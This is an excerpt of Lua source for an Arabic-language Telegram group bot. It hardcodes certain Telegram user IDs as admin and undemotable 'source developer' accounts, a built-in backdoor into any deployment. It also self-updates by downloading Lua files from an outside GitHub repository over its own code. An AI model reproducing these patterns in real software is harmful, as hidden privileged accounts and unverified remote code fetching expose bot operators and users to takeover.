...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1799061414 or msg.sender_user_id_ == 1930359414 then 
Adminn = true
...
download_file('https://raw.githubusercontent.com/FAWAZ8297/ee6ee/main/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████       |') end
download_file('https://raw.githubusercontent.com/FAWAZ8297/ee6ee/main/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████     |') end
download_file('https://raw.githubusercontent.com/FAWAZ8297/ee6ee/main/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████   |') end
download_file('https://raw.githubusercontent.com/FAWAZ8297/ee6ee/main/inc/functions.lua','./inc/functions.lua')
download_file('https://raw.githubusercontent.com/FAWAZ8297/ee6ee/main/plugins/games.lua','./plugins/games.lua')
...
result = false
if msg.sender_user_id_ == 1799061414 or msg.sender_user_id_ == 1799061414 then 
SudoBase = true
...
var = 'هذا البوت' 
elseif UserID == 1799061414or UserID == 1799061414 then 
var = 'مطور السورس '
...
elseif UserID == 1799061414 or UserID == 1619524486 then 
...
if UserID == 1619524486 or UserID == 1799061414 then return sendMsg(ChatID,MsgID,"⇠ مايمديك تنزل مطور السورس!") end
